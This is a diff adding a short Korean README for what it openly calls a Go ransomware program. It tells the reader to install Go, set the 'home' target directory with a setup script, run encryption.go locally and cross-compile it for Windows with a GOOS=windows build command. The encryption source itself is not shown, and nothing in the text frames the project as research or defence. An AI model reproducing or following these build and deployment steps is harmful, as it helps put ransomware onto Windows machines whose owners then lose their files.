@@ -1,0 +1,22 @@
+본 렌섬웨어는 GO라는 특수 프로그래밍 언어를 사용합니다. 
+사용하기전 GO 언어를 다운로드해주세요
+
+[리눅스에서 윈도우로 컴파일링 필요]
+
+# GO  렌섬웨어
+
+
+'home' 대상 디렉토리를 설정하려면 다음 단계를 따르세요:
+
+./setup-env.sh
+
+
+로컬로 실행하기:
+
+go run encryption.go
+
+
+윈도우 컴파일링:
+
+env GOOS=windows GOARCH=amd64 go build encryption.go
+
